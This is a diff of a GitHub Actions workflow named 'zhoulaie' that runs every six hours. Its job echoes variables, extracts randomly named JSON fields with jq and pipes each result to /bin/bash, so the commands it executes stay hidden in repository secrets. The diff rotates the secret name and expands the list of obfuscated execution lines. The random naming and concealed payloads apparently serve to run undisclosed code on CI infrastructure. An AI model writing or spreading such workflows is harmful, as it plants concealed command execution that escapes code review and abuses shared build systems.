@@ -1,27 +1,27 @@
 name: zhoulaie
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
-
-jobs:  # 22649
+    - cron: '41 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhoulaie
         env:
-          ichw7088: ${{ secrets.ichw7088 }}
+          mvlr3934: ${{ secrets.mvlr3934 }}
         run: |
-          echo $ichw7088 | jq -r .m223 | /bin/bash
-          echo $vulw29 | jq -r .jik2 | /bin/bash
-          echo $vvg5101 | jq -r .x7965 | /bin/bash
-          echo $vsrk56753 | jq -r .cnvgu6414 | /bin/bash
-          echo $pzar23 | jq -r .ucukn93009 | /bin/bash
-          echo $sw59 | jq -r .az7 | /bin/bash
-          echo $squ4 | jq -r .hgage1 | /bin/bash
-          echo $xzqyd7716 | jq -r .ii44618 | /bin/bash
-          echo $smgbe0 | jq -r .njtaq2428 | /bin/bash
+          echo $mvlr3934 | jq -r .cmcl67 | /bin/bash
+          echo $ehllr1 | jq -r .cqyp6 | /bin/bash
+          echo $pnpxy9 | jq -r .dx64 | /bin/bash
+          echo $w5 | jq -r .d1173 | /bin/bash
+          echo $tkvtn3358 | jq -r .ihn74 | /bin/bash
+          echo $difjt0 | jq -r .hfehe9 | /bin/bash
+          echo $jm82583 | jq -r .oj55202 | /bin/bash
+          echo $os202 | jq -r .tpvil70278 | /bin/bash
+          echo $gspi2 | jq -r .kk68 | /bin/bash
+          echo $tndfz25180 | jq -r .odsdi89178 | /bin/bash
+          echo $wtb639 | jq -r .v336 | /bin/bash
+          echo $vdzbc99 | jq -r .hn079 | /bin/bash
 
